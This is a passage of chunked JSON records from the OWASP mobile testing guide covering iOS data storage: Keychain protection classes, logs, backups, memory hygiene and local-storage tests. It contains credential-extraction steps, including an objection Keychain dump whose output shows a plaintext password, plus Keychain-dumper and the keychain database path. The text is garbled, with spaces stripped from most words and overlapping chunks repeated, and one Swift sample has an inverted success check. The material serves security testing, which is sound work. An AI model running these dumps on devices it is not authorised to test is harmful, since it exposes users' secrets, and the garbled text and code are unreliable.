Lite Databases CouchbaseLiteisalightweight,embedded,document-oriented(NoSQL)databaseenginethatcanbesynced. Itcompiles nativelyforiOSandmacOS. YapDatabase YapDatabaseisakey/valuestorebuiltontopofSQLite. 399\\nUser Interface UI Components Entering sensitive information when, for example, registering an account or making payments, is an essential part of usingmanyapps. Thisdatamaybefinancialinformationsuchascreditcarddataoruseraccountpasswords. Thedata maybeexposediftheappdoesn’tproperlymaskitwhileitisbeingtyped. In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be presentitshouldbeproperlymasked,typicallybyshowingasterisksordotsinsteadofcleartext. CarefullyreviewallUIcomponentsthateithershowsuchinformationortakeitasinput. Searchforanytracesofsensitive informationandevaluateifitshouldbemaskedorcompletelyremoved. Screenshots Manufacturerswanttoprovidedeviceuserswithanaestheticallypleasingeffectwhenanapplicationisstartedorexited, so they introduced the concept of saving a screenshot when the application goes into the background. This feature can pose a security risk because screenshots (which may display sensitive information such as an email or corporate documents) are written to local storage, where they can be recovered by a rogue application with a sandbox bypass exploitorsomeonewhostealsthedevice. Keyboard Cache Severaloptions,suchasautocorrectandspellcheck,areavailabletouserstosimplifykeyboardinputandarecachedby defaultin.datfilesin/private/var/mobile/Library/Keyboard/anditssubdirectories. The UITextInputTraits protocol is used for keyboard caching. The UITextField, UITextView, and UISearchBar classes automaticallysupportthisprotocolanditoffersthefollowingproperties: • varautocorrectionType:UITextAutocorrectionTypedetermineswhetherautocorrectionisenabledduringtyp- ing. When autocorrection is enabled, the text object tracks unknown words and suggests suitable replacements, replacingthetypedtextautomaticallyunlesstheuseroverridesthereplacement. Thedefaultvalueofthisproperty isUITextAutocorrectionTypeDefault,whichformostinputmethodsenablesautocorrection. • var secureTextEntry: BOOL determines whether text copying and text caching are disabled and hides the text beingenteredforUITextField. ThedefaultvalueofthispropertyisNO. Internal Storage Data Protection API AppdeveloperscanleveragetheiOSDataProtectionAPIstoimplementfine-grainedaccesscontrolforuserdatastored inflashmemory. TheAPIsarebuiltontopoftheSecureEnclaveProcessor(SEP),whichwasintroducedwiththeiPhone 5S.TheSEPisacoprocessorthatprovidescryptographicoperationsfordataprotectionandkeymanagement. Adevice- specifichardwarekey-thedeviceUID(UniqueID)-isembeddedinthesecureenclave,ensuringtheintegrityofdatapro- tectionevenwhentheoperatingsystemkerneliscompromised. YoucanlearnmoreabouttheSecureEnclaveinthisBlackHatpresentation“DemystifyingtheSecureEnclavePro- cessor”byTarjeiMandt,MathewSolnikandDavidWang. Thedataprotectionarchitectureisbasedonahierarchyofkeys. TheUIDandtheuserpasscodekey(whichisderivedfrom theuser’spassphraseviathePBKDF2algorithm)sitatthetopofthishierarchy. Together,theycanbeusedto“unlock” so-calledclasskeys,whichareassociatedwithdifferentdevicestates(e.g.,devicelocked/unlocked). EveryfilestoredontheiOSfilesystemisencryptedwithitsownper-filekey,whichiscontainedinthefilemetadata. The metadataisencryptedwiththefilesystemkeyandwrappedwiththeclasskeycorrespondingtotheprotectionclassthe appselectedwhencreatingthefile. ThefollowingillustrationshowstheiOSDataProtectionKeyHierarchy. 400\\nFiles can be assigned to one of four different protection classes, which are explained in more detail in theiOS Security Guide: • CompleteProtection(NSFileProtectionComplete): AkeyderivedfromtheuserpasscodeandthedeviceUID protectsthisclasskey. Thederivedkeyiswipedfrommemoryshortlyafterthedeviceislocked,makingthedata inaccessibleuntiltheuserunlocksthedevice. • ProtectedUnlessOpen(NSFileProtectionCompleteUnlessOpen): ThisprotectionclassissimilartoComplete Protection,but,ifthefileisopenedwhenunlocked,theappcancontinuetoaccessthefileeveniftheuserlocks thedevice. Thisprotectionclassisusedwhen,forexample,amailattachmentisdownloadinginthebackground. • Protected Until First User Authentication (NSFileProtectionCompleteUntilFirstUserAuthentication): Thefilecanbeaccessedassoonastheuserunlocksthedeviceforthefirsttimeafterbooting. Itcanbeaccessed eveniftheusersubsequentlylocksthedeviceandtheclasskeyisnotremovedfrommemory. • No Protection (NSFileProtectionNone): The key for this protection class is protected with the UID only. The",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 136
    }
  },
  {
    "text": "classes, which are explained in more detail in theiOS Security Guide: • CompleteProtection(NSFileProtectionComplete): AkeyderivedfromtheuserpasscodeandthedeviceUID protectsthisclasskey. Thederivedkeyiswipedfrommemoryshortlyafterthedeviceislocked,makingthedata inaccessibleuntiltheuserunlocksthedevice. • ProtectedUnlessOpen(NSFileProtectionCompleteUnlessOpen): ThisprotectionclassissimilartoComplete Protection,but,ifthefileisopenedwhenunlocked,theappcancontinuetoaccessthefileeveniftheuserlocks thedevice. Thisprotectionclassisusedwhen,forexample,amailattachmentisdownloadinginthebackground. • Protected Until First User Authentication (NSFileProtectionCompleteUntilFirstUserAuthentication): Thefilecanbeaccessedassoonastheuserunlocksthedeviceforthefirsttimeafterbooting. Itcanbeaccessed eveniftheusersubsequentlylocksthedeviceandtheclasskeyisnotremovedfrommemory. • No Protection (NSFileProtectionNone): The key for this protection class is protected with the UID only. The class key is stored in “Effaceable Storage”, which is a region of flash memory on the iOS device that allows the storage of small amounts of data. This protection class exists for fast remote wiping (immediate deletion of the classkey,whichmakesthedatainaccessible). AllclasskeysexceptNSFileProtectionNoneareencryptedwithakeyderivedfromthedeviceUIDandtheuser’spass- code. Asaresult,decryptioncanhappenonlyonthedeviceitselfandrequiresthecorrectpasscode. SinceiOS7,thedefaultdataprotectionclassis“ProtectedUntilFirstUserAuthentication”. External Storage The Keychain TheiOSKeychaincanbeusedtosecurelystoreshort,sensitivebitsofdata,suchasencryptionkeysandsessiontokens. ItisimplementedasanSQLitedatabasethatcanbeaccessedthroughtheKeychainAPIsonly. OnmacOS,everyuserapplicationcancreateasmanyKeychainsasdesired,andeveryloginaccounthasitsownKeychain. ThestructureoftheKeychainoniOSisdifferent: onlyoneKeychainisavailabletoallapps. Accesstotheitemscanbe sharedbetweenappssignedbythesamedeveloperviatheaccessgroupsfeatureoftheattributekSecAttrAccessGroup. Access to the Keychain is managed by the securityd daemon, which grants access according to the app’s Keychain- access-groups,application-identifier,andapplication-groupentitlements. TheKeychainAPIincludesthefollowingmainoperations: • SecItemAdd • SecItemUpdate • SecItemCopyMatching • SecItemDelete 401\\nDatastoredintheKeychainisprotectedviaaclassstructurethatissimilartotheclassstructureusedforfileencryption. ItemsaddedtotheKeychainareencodedasabinaryplistandencryptedwitha128-bitAESper-itemkeyinGalois/Counter Mode(GCM).Notethatlargerblobsofdataaren’tmeanttobesaveddirectlyintheKeychain-that’swhattheDataProtec- tionAPIisfor. YoucanconfiguredataprotectionforKeychainitemsbysettingthekSecAttrAccessiblekeyinthecallto SecItemAddorSecItemUpdate. ThefollowingconfigurableaccessibilityvaluesforkSecAttrAccessiblearetheKeychain DataProtectionclasses: • kSecAttrAccessibleAlways: The data in the Keychain item can always be accessed, regardless of whether the deviceislocked. • kSecAttrAccessibleAlwaysThisDeviceOnly: ThedataintheKeychainitemcanalwaysbeaccessed,regardless ofwhetherthedeviceislocked. Thedatawon’tbeincludedinaniCloudorlocalbackup. • kSecAttrAccessibleAfterFirstUnlock: ThedataintheKeychainitemcan’tbeaccessedafterarestartuntilthe devicehasbeenunlockedoncebytheuser. • kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly: The data in the Keychainitem can’t be accessed after a restart until the device has been unlocked once by the user. Items with this attribute do not migrate to a new device. Thus,afterrestoringfromabackupofadifferentdevice,theseitemswillnotbepresent. • kSecAttrAccessibleWhenUnlocked: The data in the Keychain item can be accessed only while the device is un- lockedbytheuser. • kSecAttrAccessibleWhenUnlockedThisDeviceOnly: The data in the Keychain item can be accessed only while thedeviceisunlockedbytheuser. Thedatawon’tbeincludedinaniCloudorlocalbackup. • kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly: ThedataintheKeychaincanbeaccessedonlywhenthe device is unlocked. This protection class is only available if a passcode is set on the device. The data won’t be includedinaniCloudorlocalbackup. AccessControlFlags define the mechanisms with which users can authenticate the key (SecAccessControlCreate- Flags): • kSecAccessControlDevicePasscode: Accesstheitemviaapasscode. • kSecAccessControlBiometryAny: Access the item via one of the fingerprints registered to Touch ID. Adding or removingafingerprintwon’tinvalidatetheitem. • kSecAccessControlBiometryCurrentSet:AccesstheitemviaoneofthefingerprintsregisteredtoTouchID.Adding orremovingafingerprintwillinvalidatetheitem. • kSecAccessControlUserPresence: Accesstheitemviaeitheroneoftheregisteredfingerprints(usingTouchID)or defaulttothepasscode. Please note that keys secured by Touch ID (via kSecAccessControlBiometryAny or kSecAccessControlBiometryCur- rentSet)areprotectedbytheSecureEnclave: TheKeychainholdsatokenonly,nottheactualkey. Thekeyresidesin theSecureEnclave. StartingwithiOS9,youcandoECC-basedsigningoperationsintheSecureEnclave. Inthatscenario,theprivatekeyand thecryptographicoperationsresidewithintheSecureEnclave. Seethestaticanalysissectionformoreinfooncreating theECCkeys. iOS9supportsonly256-bitECC.Furthermore,youneedtostorethepublickeyintheKeychainbecauseit can’tbestoredintheSecureEnclave. Afterthekeyiscreated,youcanusethekSecAttrKeyTypetoindicatethetypeof algorithmyouwanttousethekeywith. In case you want to use these mechanisms, it is recommended to test whether the passcode has been set. In iOS 8, you will need to check whether you can read/write from an item in the Keychain protected by the kSecAttrAccessi- bleWhenPasscodeSetThisDeviceOnly attribute. From iOS 9 onward you can check whether a lock screen is set, using LAContext: Swift: public func devicePasscodeEnabled()->Bool { return LAContext().canEvaluatePolicy(.deviceOwnerAuthentication,error:nil) } Objective-C: -(BOOL)devicePasscodeEnabled:(LAContext)context{ if([contextcanEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationerror:nil]) { return true; }else { return false; } } 402\\nHere is sample Swift code you can use to create keys (Notice the kSecAttrTokenID as String: kSecAttrTokenIDSe- cureEnclave: thisindicatesthatwewanttousetheSecureEnclavedirectly.): //privatekeyparameters letprivateKeyParams =[ kSecAttrLabel asString:\"privateLabel\", kSecAttrIsPermanent asString:true, kSecAttrApplicationTag asString:\"applicationTag\", ]asCFDictionary //publickeyparameters letpublicKeyParams =[ kSecAttrLabel asString:\"publicLabel\", kSecAttrIsPermanent asString:false, kSecAttrApplicationTag asString:\"applicationTag\", ]asCFDictionary //globalparameters letparameters =[ kSecAttrKeyType asString:kSecAttrKeyTypeEC, kSecAttrKeySizeInBits asString:256, kSecAttrTokenID asString:kSecAttrTokenIDSecureEnclave, kSecPublicKeyAttrs asString:publicKeyParams, kSecPrivateKeyAttrs asString:privateKeyParams, ]asCFDictionary varpubKey,privKey:SecKey? letstatus =SecKeyGeneratePair(parameters,&pubKey,&privKey) ifstatus !=errSecSuccess { //Keyscreatedsuccessfully } Keychain Data Persistence OniOS,whenanapplicationisuninstalled,theKeychaindatausedbytheapplicationisretainedbythedevice,unlikethe datastoredbytheapplicationsandboxwhichiswiped. Intheeventthatausersellstheirdevicewithoutperforminga factoryreset,thebuyerofthedevicemaybeabletogainaccesstotheprevioususer’sapplicationaccountsanddataby reinstallingthesameapplicationsusedbytheprevioususer. Thiswouldrequirenotechnicalabilitytoperform. When assessing an iOS application, you should look for Keychain data persistence. This is normally done by using the application to generate sample data that may be",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 137
    }
  },
  {
    "text": "asString:kSecAttrTokenIDSecureEnclave, kSecPublicKeyAttrs asString:publicKeyParams, kSecPrivateKeyAttrs asString:privateKeyParams, ]asCFDictionary varpubKey,privKey:SecKey? letstatus =SecKeyGeneratePair(parameters,&pubKey,&privKey) ifstatus !=errSecSuccess { //Keyscreatedsuccessfully } Keychain Data Persistence OniOS,whenanapplicationisuninstalled,theKeychaindatausedbytheapplicationisretainedbythedevice,unlikethe datastoredbytheapplicationsandboxwhichiswiped. Intheeventthatausersellstheirdevicewithoutperforminga factoryreset,thebuyerofthedevicemaybeabletogainaccesstotheprevioususer’sapplicationaccountsanddataby reinstallingthesameapplicationsusedbytheprevioususer. Thiswouldrequirenotechnicalabilitytoperform. When assessing an iOS application, you should look for Keychain data persistence. This is normally done by using the application to generate sample data that may be stored in the Keychain, uninstalling the application, then reinstalling the application to see whether the data was retained between application installations. Use objection runtime mobile explorationtoolkittodumpthekeychaindata. Thefollowingobjectioncommanddemonstratesthisprocedure: ...itudehacks.DVIAswiftv2.developon (iPhone:13.2.3)[usb] #ioskeychaindump Note:YoumaybeaskedtoauthenticateusingthedevicespasscodeorTouchID Savetheoutputbyadding `--jsonkeychain.json`tothiscommand DumpingtheiOSkeychain... Created Accessible ACL Type Account Service Data ------------------------- ------------------------------ ----- -------- ------------------------- ↪ ------------------------------------------------------------- ------------------------------------ 2020-02-1113:26:52+0000 WhenUnlocked None Password keychainValue com.highaltitudehacks.DVIAswiftv2.develop ↪ mysecretpass123 There’s no iOS API that developers can use to force wipe data when an application is uninstalled. Instead, developers shouldtakethefollowingstepstopreventKeychaindatafrompersistingbetweenapplicationinstallations: • Whenanapplicationisfirstlaunchedafterinstallation,wipeallKeychaindataassociatedwiththeapplication. This willpreventadevice’sseconduserfromaccidentallygainingaccesstotheprevioususer’saccounts. Thefollowing Swiftexampleisabasicdemonstrationofthiswipingprocedure: letuserDefaults =UserDefaults.standard ifuserDefaults.bool(forKey:\"hasRunBefore\")==false { //RemoveKeychainitemshere //Updatetheflagindicator userDefaults.set(true,forKey:\"hasRunBefore\") } • WhendevelopinglogoutfunctionalityforaniOSapplication,makesurethattheKeychaindataiswipedaspartof accountlogout. Thiswillallowuserstocleartheiraccountsbeforeuninstallinganapplication. 403\\nLogs Therearemanylegitimatereasonsforcreatinglogfilesonamobiledevice,includingkeepingtrackofcrashesorerrors thatarestoredlocallywhilethedeviceisoffline(sothattheycanbesenttotheapp’sdeveloperonceonline),andstoring usagestatistics. However,loggingsensitivedata,suchascreditcardnumbersandsessioninformation,mayexposethe datatoattackersormaliciousapplications. Logfilescanbecreatedinseveralways. Thefollowinglistshowsthemethods availableoniOS: • NSLogMethod • printf-likefunction • NSAssert-likefunction • Macro Backups iOSincludesauto-backupfeaturesthatcreatecopiesofthedatastoredonthedevice. YoucanmakeiOSbackupsfrom your host computer by using iTunes (till macOS Catalina) or Finder (from macOS Catalina onwards), or via the iCloud backupfeature. Inbothcases,thebackupincludesnearlyalldatastoredontheiOSdeviceexcepthighlysensitivedata suchasApplePayinformationandTouchIDsettings. SinceiOSbacksupinstalledappsandtheirdata,anobviousconcerniswhethersensitiveuserdatastoredbytheappmight unintentionallyleakthroughthebackup. Anotherconcern,thoughlessobvious,iswhethersensitiveconfigurationsettings used to protect data or restrict app functionality could be tampered to change app behavior after restoring a modified backup. Bothconcernsarevalidandthesevulnerabilitieshaveproventoexistinavastnumberofappstoday. How the Keychain Is Backed Up When users back up their iOS device, the Keychain data is backed up as well, but the secrets in the Keychain remain encrypted. TheclasskeysnecessarytodecrypttheKeychaindataaren’tincludedinthebackup. RestoringtheKeychain datarequiresrestoringthebackuptoadeviceandunlockingthedevicewiththeuserspasscode. KeychainitemsforwhichthekSecAttrAccessibleWhenPasscodeSetThisDeviceOnly attributeissetcanbedecrypted only if the backup is restored to the backed up device. Someone trying to extract this Keychain data from the backup couldn’tdecryptitwithoutaccesstothecryptohardwareinsidetheoriginatingdevice. One caveat to using the Keychain, however, is that it was only designed to store small bits of user data or short notes (accordingtoApple’sdocumentationonKeychainServices). Thismeansthatappswithlargerlocalsecurestorageneeds (e.g.,messagingapps,etc.) shouldencryptthedatawithintheappcontainer,butusetheKeychaintostorekeymaterial. Incaseswheresensitiveconfigurationsettings(e.g.,datalosspreventionpolicies,passwordpolicies,compliancepolicies, etc)mustremainunencryptedwithintheappcontainer,youcanconsiderstoringahashofthepoliciesinthekeychain for integrity checking. Without an integrity check, these settings could be modified within a backup and then restored backtothedevicetomodifyappbehavior(e.g.,changeconfiguredremoteendpoints)orsecuritysettings(e.g.,jailbreak detection,certificatepinning,maximumUIloginattempts,etc.). The takeaway: If sensitive data is handled as recommended earlier in this chapter (e.g., stored in the Keychain, with Keychainbackedintegritychecks,orencryptedwithakeythat’slockedinsidetheKeychain),backupsshouldn’tbesecurity issue. Process Memory Analyzingmemorycanhelpdeveloperstoidentifytherootcausesofproblemssuchasapplicationcrashes. However,it canalsobeusedtoaccesstosensitivedata. Thissectiondescribeshowtocheckprocess’memoryfordatadisclosure. First,identifythesensitiveinformationthat’sstoredinmemory. Sensitiveassetsareverylikelytobeloadedintomemory atsomepoint. Theobjectiveistomakesurethatthisinfoisexposedasbrieflyaspossible. Toinvestigateanapplication’smemory,firstcreateamemorydump. Alternatively,youcananalyzethememoryinreal timewith,forexample,adebugger. Regardlessofthemethodyouuse,thisisaveryerror-proneprocessbecausedumps provide the data left by executed functions and you might miss executing critical steps. In addition, overlooking data duringanalysisisquiteeasytodounlessyouknowthefootprintofthedatayou’relookingfor(eitheritsexactvalueor 404\\nitsformat). Forexample,iftheappencryptsaccordingtoarandomlygeneratedsymmetrickey,you’reveryunlikelyto spotthekeyinmemoryunlessyoufinditsvaluebyothermeans. Before looking into the source code, checking the documentation and identifying application components provide an overviewofwheredatamightbeexposed. Forexample,whilesensitivedatareceivedfromabackendexistsinthefinal model object, multiple copies may also existin the HTTPclient or the XML parser. All these copies should be removed frommemoryassoonaspossible. Understanding the application’s architecture and its interaction with the OS will help you identify sensitive information that doesn’t have to be exposed in memory at all. For example, assume your app receives data from one server and transfersittoanotherwithoutneedinganyadditionalprocessing. Thatdatacanbereceivedandhandledinencrypted form,whichpreventsexposureviamemory. However,ifsensitivedatadoesneedtobeexposedviamemory,makesurethatyourappexposesasfewcopiesofthis dataaspossibleforaslittletimeaspossible. Inotherwords,youwantcentralizedhandlingofsensitivedata,basedon primitiveandmutabledatastructures. Suchdatastructuresgivedevelopersdirectaccesstomemory. Makesurethatthisaccessisusedtooverwritethesensitive data and cryptographic keys with zeroes. Apple Secure Coding Guide suggests zeroing sensitive data after usage, but providesnorecommendedwaysofdoingthis. Examplesofpreferabledatatypesincludechar []andint [],butnotNSStringorString. Wheneveryoutrytomodify animmutableobject,suchasaString,youactuallycreateacopyandchangethecopy. ConsiderusingNSMutableData forstoringsecretsonSwift/Objective-CanduseresetBytes(in:) methodforzeroing. Also,seeCleanmemoryofsecret dataforreference. AvoidSwiftdatatypesotherthancollectionsregardlessofwhethertheyareconsideredmutable. ManySwiftdatatypes holdtheirdatabyvalue,notbyreference. Althoughthisallowsmodificationofthememoryallocatedtosimpletypeslike charandint,handlingacomplextypesuchasStringbyvalueinvolvesahiddenlayerofobjects,structures,orprimitive arrayswhosememorycan’tbedirectlyaccessedormodified. Certaintypesofusagemayseemtocreateamutabledata object (and even be documented as doing so), but",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 138
    }
  },
  {
    "text": "However,ifsensitivedatadoesneedtobeexposedviamemory,makesurethatyourappexposesasfewcopiesofthis dataaspossibleforaslittletimeaspossible. Inotherwords,youwantcentralizedhandlingofsensitivedata,basedon primitiveandmutabledatastructures. Suchdatastructuresgivedevelopersdirectaccesstomemory. Makesurethatthisaccessisusedtooverwritethesensitive data and cryptographic keys with zeroes. Apple Secure Coding Guide suggests zeroing sensitive data after usage, but providesnorecommendedwaysofdoingthis. Examplesofpreferabledatatypesincludechar []andint [],butnotNSStringorString. Wheneveryoutrytomodify animmutableobject,suchasaString,youactuallycreateacopyandchangethecopy. ConsiderusingNSMutableData forstoringsecretsonSwift/Objective-CanduseresetBytes(in:) methodforzeroing. Also,seeCleanmemoryofsecret dataforreference. AvoidSwiftdatatypesotherthancollectionsregardlessofwhethertheyareconsideredmutable. ManySwiftdatatypes holdtheirdatabyvalue,notbyreference. Althoughthisallowsmodificationofthememoryallocatedtosimpletypeslike charandint,handlingacomplextypesuchasStringbyvalueinvolvesahiddenlayerofobjects,structures,orprimitive arrayswhosememorycan’tbedirectlyaccessedormodified. Certaintypesofusagemayseemtocreateamutabledata object (and even be documented as doing so), but they actually create a mutable identifier (variable) instead of an immutableidentifier(constant). Forexample,manythinkthatthefollowingresultsinamutableStringinSwift,butthis isactuallyanexampleofavariablewhosecomplexvaluecanbechanged(replaced,notmodifiedinplace): varstr1 =\"Goodbye\" //\"Goodbye\",baseaddress: 0x0001039e8dd0 str1.append(\"\") //\"Goodbye\",baseaddress: 0x608000064ae0 str1.append(\"cruelworld!\") //\"Goodbyecruelworld\",baseaddress:0x6080000338a0 str1.removeAll() //\"\",baseaddress 0x00010bd66180 Noticethatthebaseaddressoftheunderlyingvaluechangeswitheachstringoperation. Hereistheproblem: Tosecurely erase the sensitive information from memory, we don’t want to simply change the value of the variable; we want to changetheactualcontentofthememoryallocatedforthecurrentvalue. Swiftdoesn’toffersuchafunction. Swiftcollections(Array,Set,andDictionary),ontheotherhand,maybeacceptableiftheycollectprimitivedatatypes suchascharorintandaredefinedasmutable(i.e.,asvariablesinsteadofconstants),inwhichcasetheyaremoreor lessequivalenttoaprimitivearray(suchaschar []). Thesecollectionsprovidememorymanagement,whichcanresult inunidentifiedcopiesofthesensitivedatainmemoryifthecollectionneedstocopytheunderlyingbuffertoadifferent locationtoextendit. UsingmutableObjective-Cdatatypes,suchasNSMutableString,mayalsobeacceptable,butthesetypeshavethesame memory issue as Swift collections. Pay attention when using Objective-C collections; they hold data by reference, and onlyObjective-Cdatatypesareallowed. Therefore,wearelooking,notforamutablecollection,butforacollectionthat referencesmutableobjects. Aswe’veseensofar,usingSwiftorObjective-Cdatatypesrequiresadeepunderstandingofthelanguageimplementa- tion. Furthermore,therehasbeensomecorere-factoringinbetweenmajorSwiftversions,resultinginmanydatatypes’ behaviorbeingincompatiblewiththatofothertypes. Toavoidtheseissues,werecommendusingprimitivedatatypes wheneverdataneedstobesecurelyerasedfrommemory. Unfortunately, few libraries and frameworks are designed to allow sensitive data to be overwritten. Not even Apple considersthisissueintheofficialiOSSDKAPI.Forexample,mostoftheAPIsfordatatransformation(passers,serializes, etc.) operateonnon-primitivedatatypes. Similarly, regardlessofwhetheryouflagsomeUITextFieldasSecureText Entryornot,italwaysreturnsdataintheformofaStringorNSString. 405\\nIPC InterProcessCommunication(IPC)allowsprocessestosendeachothermessagesanddata. Forprocessesthatneedto communicatewitheachother,therearedifferentwaystoimplementIPConiOS: • XPC Services: XPC is a structured, asynchronous library that provides basic interprocess communication. It is managedbylaunchd. ItisthemostsecureandflexibleimplementationofIPConiOSandshouldbethepreferred method. It runs in the most restricted environment possible: sandboxed with no root privilege escalation and minimalfilesystemaccessandnetworkaccess. TwodifferentAPIsareusedwithXPCServices: – NSXPCConnectionAPI – XPCServicesAPI • MachPorts: AllIPCcommunicationultimatelyreliesontheMachKernelAPI.MachPortsallowlocalcommunication (intra-devicecommunication)only. TheycanbeimplementedeithernativelyorviaCoreFoundation(CFMachPort) andFoundation(NSMachPort)wrappers. • NSFileCoordinator: TheclassNSFileCoordinatorcanbeusedtomanageandsenddatatoandfromappsvia filesthatareavailableonthelocalfilesystemtovariousprocesses. NSFileCoordinatormethodsrunsynchronously, so your code will be blocked until they stop executing. That’s convenient because you don’t have to wait for an asynchronousblockcallback,butitalsomeansthatthemethodsblocktherunningthread. Checking Logs for Sensitive Data Platform: ios MASVSV1: MSTG-STORAGE-3 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Usethefollowingkeywordstochecktheapp’ssourcecodeforpredefinedandcustomloggingstatements: • Forpredefinedandbuilt-infunctions: – NSLog – NSAssert – NSCAssert – fprintf • Forcustomfunctions: – Logging – Logfile AgeneralizedapproachtothisissueistouseadefinetoenableNSLogstatementsfordevelopmentanddebugging,then disablethembeforeshippingthesoftware. YoucandothisbyaddingthefollowingcodetotheappropriatePREFIX_HEADER (*.pch)file: ##ifdefDEBUG ## defineNSLog(...)NSLog(__VA_ARGS__) ##else ## defineNSLog(...) ##endif Dynamic Analysis In the section “Monitoring System Logs” of the chapter “iOS Basic Security Testing” various methods for checking the devicelogsareexplained. Navigatetoascreenthatdisplaysinputfieldsthattakesensitiveuserinformation. After starting one of the methods, fill in the input fields. If sensitive data is displayed in the output, the app fails this test. 406\\nTesting Local Data Storage Platform: ios MASVSV1: MSTG-STORAGE-1,MSTG-STORAGE-2 MASVSV2: MASVS-STORAGE-1 Overview Static Analysis WhenyouhaveaccesstothesourcecodeofaniOSapp,identifysensitivedatathat’ssavedandprocessedthroughout the app. This includes passwords, secret keys, and personally identifiable information (PII), but it may as well include otherdataidentifiedassensitivebyindustryregulations,laws,andcompanypolicies. Lookforthisdatabeingsavedvia anyofthelocalstorageAPIslistedbelow. Makesurethatsensitivedataisneverstoredwithoutappropriateprotection. Forexample,authenticationtokensshould notbesavedinNSUserDefaultswithoutadditionalencryption. Alsoavoidstoringencryptionkeysin.plistfiles,hard- codedasstringsincode,orgeneratedusingapredictableobfuscationfunctionorkeyderivationfunctionbasedonstable attributes. SensitivedatashouldbestoredbyusingtheKeychainAPI(thatstorestheminsidetheSecureEnclave),orstoredencrypted using envelope encryption. Envelope encryption, or key wrapping, is a cryptographic construct that uses symmetric encryption to encapsulate key material. Data encryption keys (DEK) can be encrypted with key encryption keys (KEK) whichmustbesecurelystoredintheKeychain. EncryptedDEKcanbestoredinNSUserDefaultsorwritteninfiles. When required, application reads KEK, then decrypts DEK. Refer to OWASP Cryptographic Storage Cheat Sheet to learn more aboutencryptingcryptographickeys. Keychain TheencryptionmustbeimplementedsothatthesecretkeyisstoredintheKeychainwithsecuresettings,ideallykSe- cAttrAccessibleWhenPasscodeSetThisDeviceOnly. Thisensurestheusageofhardware-backedstoragemechanisms. MakesurethattheAccessControlFlagsaresetaccordingtothesecuritypolicyofthekeysintheKeyChain. GenericexamplesofusingtheKeyChaintostore,update,anddeletedatacanbefoundintheofficialAppledocumentation. TheofficialAppledocumentationalsoincludesanexampleofusingTouchIDandpasscodeprotectedkeys. Filesystem Usingthesourcecode,examinethedifferentAPIsusedtostoredatalocally. Makesurethatanydataisproperlyencrypted basedonitssensitivity. Dynamic Analysis Onewaytodeterminewhethersensitiveinformation(likecredentialsandkeys)isstoredinsecurelywithoutleveraging nativeiOSfunctionsistoanalyzetheapp’sdatadirectory. Triggeringallappfunctionalitybeforethedataisanalyzedis important because the app may store sensitive data only after specific functionality has been triggered. You can then performstaticanalysisforthedatadumpaccordingtogenerickeywordsandapp-specificdata. ThefollowingstepscanbeusedtodeterminehowtheapplicationstoresdatalocallyonajailbrokeniOSdevice: 1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttotheiOSdeviceandnavigatetoitsBundledirectory(thisappliestoiOSversions8.0andabove): /var/ mobile/Containers/Data/Application/$APP_ID/ 3. Executegrepwiththedatathatyou’vestored,forexample: grep -iRn \"USERID\". 4. Ifthesensitivedataisstoredinplaintext,theappfailsthistest. Youcananalyzetheapp’sdatadirectoryonanon-jailbrokeniOSdevicebyusingthird-partyapplications,suchasiMaz- ing. 407\\n1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttheiOSdevicetoyourhostcomputerandlaunchiMazing. 3. Select“Apps”,right-clickthedesirediOSapplication,andselect“ExtractApp”. 4. Navigatetotheoutputdirectoryandlocate$APP_NAME.imazing. Renameitto$APP_NAME.zip. 5. UnpacktheZIPfile. Youcanthenanalyzetheapplicationdata. NotethattoolslikeiMazingdon’tcopydatadirectlyfromthedevice. Theytrytoextractdatafromthebackupsthey create. Therefore,gettingalltheappdatathat’sstoredontheiOSdeviceisimpossible: notallfoldersareincluded inbackups. UseajailbrokendeviceorrepackagetheappwithFridaanduseatoollikeobjectiontoaccessallthe dataandfiles. IfyouaddedtheFridalibrarytotheappandrepackageditasdescribedin“DynamicAnalysisonNon-JailbrokenDevices” (from the “Tampering and Reverse Engineering on iOS” chapter), you can use",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 139
    }
  },
  {
    "text": "performstaticanalysisforthedatadumpaccordingtogenerickeywordsandapp-specificdata. ThefollowingstepscanbeusedtodeterminehowtheapplicationstoresdatalocallyonajailbrokeniOSdevice: 1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttotheiOSdeviceandnavigatetoitsBundledirectory(thisappliestoiOSversions8.0andabove): /var/ mobile/Containers/Data/Application/$APP_ID/ 3. Executegrepwiththedatathatyou’vestored,forexample: grep -iRn \"USERID\". 4. Ifthesensitivedataisstoredinplaintext,theappfailsthistest. Youcananalyzetheapp’sdatadirectoryonanon-jailbrokeniOSdevicebyusingthird-partyapplications,suchasiMaz- ing. 407\\n1. Triggerthefunctionalitythatstorespotentiallysensitivedata. 2. ConnecttheiOSdevicetoyourhostcomputerandlaunchiMazing. 3. Select“Apps”,right-clickthedesirediOSapplication,andselect“ExtractApp”. 4. Navigatetotheoutputdirectoryandlocate$APP_NAME.imazing. Renameitto$APP_NAME.zip. 5. UnpacktheZIPfile. Youcanthenanalyzetheapplicationdata. NotethattoolslikeiMazingdon’tcopydatadirectlyfromthedevice. Theytrytoextractdatafromthebackupsthey create. Therefore,gettingalltheappdatathat’sstoredontheiOSdeviceisimpossible: notallfoldersareincluded inbackups. UseajailbrokendeviceorrepackagetheappwithFridaanduseatoollikeobjectiontoaccessallthe dataandfiles. IfyouaddedtheFridalibrarytotheappandrepackageditasdescribedin“DynamicAnalysisonNon-JailbrokenDevices” (from the “Tampering and Reverse Engineering on iOS” chapter), you can use objection to transfer files directly from the app’s data directory or read files in objection as explained in the chapter “Basic Security Testing on iOS”, section “Host-DeviceDataTransfer”. TheKeychaincontentscanbedumpedduringdynamicanalysis. Onajailbrokendevice,youcanuseKeychaindumper asdescribedinthechapter“BasicSecurityTestingoniOS”. ThepathtotheKeychainfileis /private/var/Keychains/keychain-2.db 